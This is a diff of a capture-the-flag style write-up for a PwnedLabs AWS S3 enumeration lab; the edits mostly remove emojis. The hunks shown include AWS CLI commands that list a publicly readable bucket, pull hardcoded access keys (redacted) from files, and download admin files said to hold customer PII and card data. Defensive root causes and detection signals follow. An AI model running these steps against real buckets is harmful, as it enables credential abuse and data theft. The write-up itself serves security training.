@@ -1,7 +1,6 @@
 # AWS S3 Enumeration Basics — PwnedLabs Writeup
 **Author:** Jashwanth | **Platform:** PwnedLabs | **Difficulty:** Beginner  
-**Tags:** `AWS` `S3` `Enumeration` `Hardcoded Credentials` `IAM` `Privilege Escalation` `Data Exfiltration`  
-**Date Solved:** April 2026 | **Approach:** Red Team  
+**Tags:** `AWS` `S3` `Enumeration` `Hardcoded Credentials` `IAM` `Privilege Escalation` `Data Exfiltration`   
 **Lab URL:** https://pwnedlabs.io/labs/aws-s3-enumeration-basics
 
 ---
@@ -42,7 +41,7 @@ The company's development website is hosted on an S3 bucket. That bucket is part
     → [Public Shared Folder Access] → [Hardcoded Credential Extraction]
         → [Authenticated Enumeration] → [Migration File Access]
             → [IT Admin Credential Extraction] → [Restricted Admin Folder Access]
-                → [Flag + PII/Credit Card Data Exfiltrated] ✅
+                → [Flag + PII/Credit Card Data Exfiltrated] 
 ```
 
 ---
@@ -79,7 +78,7 @@ ping dev.huge-logistics.com
 # PING s3-website.us-east-1.amazonaws.com (TARGET_IP)
 ```
 
-> 💡 The ping resolves to `s3-website.us-east-1.amazonaws.com` — this immediately tells us the site is **hosted on an S3 static website**, not a traditional web server. This is a critical recon finding.
+>  The ping resolves to `s3-website.us-east-1.amazonaws.com` — this immediately tells us the site is **hosted on an S3 static website**, not a traditional web server. This is a critical recon finding.
 
 **Page source inspection:**  
 Viewed the HTML source. Found direct references to S3 bucket URLs including CSS and JS files being served from:
@@ -111,7 +110,7 @@ PRE static/
 2023-10-16 14:00:47   5347 index.html
 ```
 
-> 💡 `--no-sign-request` tells the AWS CLI to skip authentication entirely. If a bucket returns results with this flag, it means it's **publicly readable** — one of the most common S3 misconfigurations.
+>  `--no-sign-request` tells the AWS CLI to skip authentication entirely. If a bucket returns results with this flag, it means it's **publicly readable** — one of the most common S3 misconfigurations.
 
 **Four folders found:** `admin/`, `migration-files/`, `shared/`, `static/`
 
@@ -120,15 +119,15 @@ Now listing each folder:
 ```bash
 # Try admin/ folder
 aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request
-# Result: AccessDenied ❌
+# Result: AccessDenied 
 
 # Try migration-files/ folder
 aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
-# Result: AccessDenied ❌
+# Result: AccessDenied 
 
 # Try shared/ folder
 aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
-# Result: SUCCESS ✅
+# Result: SUCCESS 
 ```
 
 **Output from shared/:**
@@ -137,7 +136,7 @@ aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
 2023-10-16 09:09:01       993 hl_migration_project.zip
 ```
 
-> 🚩 A zip file in a **publicly accessible shared folder** — this is immediately suspicious.
+> A zip file in a **publicly accessible shared folder** — this is immediately suspicious.
 
 ```bash
 # Try static/ folder
@@ -173,7 +172,7 @@ $secretKey = "MwGe3[snip]"
 $region    = "us-east-1"
 ```
 
-> 🔴 A developer committed AWS credentials directly into a PowerShell script, then zipped it and stored it in a public S3 folder. This is one of the most common and most damaging real-world misconfigurations.
+>  A developer committed AWS credentials directly into a PowerShell script, then zipped it and stored it in a public S3 folder. This is one of the most common and most damaging real-world misconfigurations.
 
 ---
 
@@ -247,7 +246,7 @@ aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile pwned_lab
 2023-10-16 12:00:13     2494  test-export.xml
 ```
 
-> 💡 Ironically, this folder contains documents about **migrating to AWS Secrets Manager** — they were planning to fix the hardcoded credentials issue but hadn't done it yet. `test-export.xml` is the most interesting file.
+>  Ironically, this folder contains documents about **migrating to AWS Secrets Manager** — they were planning to fix the hardcoded credentials issue but hadn't done it yet. `test-export.xml` is the most interesting file.
 
 ---
 
@@ -274,7 +273,7 @@ cat test-export.xml
 </CredentialsExport>
 ```
 
-> 🔴 **Another set of hardcoded credentials** — this time for the `AWS IT Admin` user. A credentials export file stored in plain XML inside an S3 bucket.
+> **Another set of hardcoded credentials** — this time for the `AWS IT Admin` user. A credentials export file stored in plain XML inside an S3 bucket.
 
 ---
 
@@ -311,10 +310,10 @@ aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile it-admin
 aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile it-admin
 
 cat flag.txt
-# FLAG: [captured] ✅
+# FLAG: [captured] 
 
 cat website_transactions_export.csv
-# Contains: Customer PII + plaintext credit card numbers 🔴
+# Contains: Customer PII + plaintext credit card numbers 
 ```
 
 **Full compromise achieved.** Customer payment data and sensitive credentials are in attacker hands.
@@ -378,15 +377,15 @@ grep '"objectKey"' *.json | grep -i "export\|credentials\|secrets\|password\|fla
 
 | # | Root Cause | Severity |
 |---|-----------|---------|
-| 1 | S3 bucket `shared/` folder publicly accessible with no authentication required | 🔴 Critical |
-| 2 | AWS credentials hardcoded in `migrate_secrets.ps1` and stored in a public S3 folder | 🔴 Critical |
-| 3 | AWS credentials for IT Admin stored in plaintext `test-export.xml` in S3 | 🔴 Critical |
-| 4 | `website_transactions_export.csv` with customer PII and credit card data stored in S3 unencrypted | 🔴 Critical |
-| 5 | No S3 server-side encryption enabled on sensitive objects | 🟠 High |
-| 6 | No CloudTrail alerting on anonymous S3 access events | 🟠 High |
-| 7 | `pam-test` user had `s3:ListBucket` on migration-files despite being a restricted user | 🟠 High |
-| 8 | No secrets scanning in the development pipeline to catch hardcoded credentials | 🟠 High |
-| 9 | PCI-DSS violation — credit card data stored in plaintext in an S3 bucket | 🔴 Critical + Legal |
+| 1 | S3 bucket `shared/` folder publicly accessible with no authentication required |   Critical |
+| 2 | AWS credentials hardcoded in `migrate_secrets.ps1` and stored in a public S3 folder |   Critical |
+| 3 | AWS credentials for IT Admin stored in plaintext `test-export.xml` in S3 |   Critical |
+| 4 | `website_transactions_export.csv` with customer PII and credit card data stored in S3 unencrypted |   Critical |
+| 5 | No S3 server-side encryption enabled on sensitive objects |   High |
+| 6 | No CloudTrail alerting on anonymous S3 access events |   High |
+| 7 | `pam-test` user had `s3:ListBucket` on migration-files despite being a restricted user |   High |
+| 8 | No secrets scanning in the development pipeline to catch hardcoded credentials |   High |
+| 9 | PCI-DSS violation — credit card data stored in plaintext in an S3 bucket |   Critical + Legal |
 
 ---
 
@@ -526,13 +525,13 @@ aws s3api put-bucket-versioning \
 
 | Signal | Source | Urgency |
 |--------|--------|---------|
-| Anonymous `ListObjects` on non-static S3 prefix | CloudTrail / S3 Access Logs | 🔴 Immediate |
-| `GetCallerIdentity` called from an IP outside known ranges | CloudTrail | 🔴 Immediate |
-| Bulk `GetObject` events (5+ files in <2 min) by single user | CloudTrail / CloudWatch Alarm | 🔴 Immediate |
-| Access to files named `export`, `credentials`, `secrets`, `backup` | CloudTrail + Macie | 🔴 Immediate |
-| AWS Macie PII finding in S3 object | AWS Macie | 🟠 High |
-| S3 public access block disabled on any bucket | AWS Config | 🟠 High |
-| New IAM access key created outside normal working hours | CloudTrail | 🟡 Medium |
+| Anonymous `ListObjects` on non-static S3 prefix | CloudTrail / S3 Access Logs |   Immediate |
+| `GetCallerIdentity` called from an IP outside known ranges | CloudTrail |   Immediate |
+| Bulk `GetObject` events (5+ files in <2 min) by single user | CloudTrail / CloudWatch Alarm |   Immediate |
+| Access to files named `export`, `credentials`, `secrets`, `backup` | CloudTrail + Macie |   Immediate |
+| AWS Macie PII finding in S3 object | AWS Macie |   High |
+| S3 public access block disabled on any bucket | AWS Config |   High |
+| New IAM access key created outside normal working hours | CloudTrail |   Medium |
 
 ### Incident Response Steps (Production)
 
@@ -591,7 +590,7 @@ This lab mirrors multiple real-world incidents:
 
 **PCI DSS Implication** — The `website_transactions_export.csv` file containing plaintext credit card data in an S3 bucket is a direct PCI DSS violation. In a real breach, this would trigger mandatory reporting to card brands within 72 hours and could result in fines of $5,000–$100,000 per month.
 
-> 🔗 **MITRE ATT&CK Mapping:**
+>  **MITRE ATT&CK Mapping:**
 > - T1530 — Data from Cloud Storage
 > - T1552.001 — Credentials in Files
 > - T1078.004 — Valid Accounts: Cloud Accounts
@@ -627,4 +626,4 @@ This lab mirrors multiple real-world incidents:
 
 ---
 
-*Solved by Jashwanth | [GitHub](https://github.com/JashwanthMU) | Part of the `aws-cloud-security-labs` writeup series*
+by Jashwanth | [GitHub](https://github.com/JashwanthMU) | Part of the `aws-cloud-security-labs` writeup series*
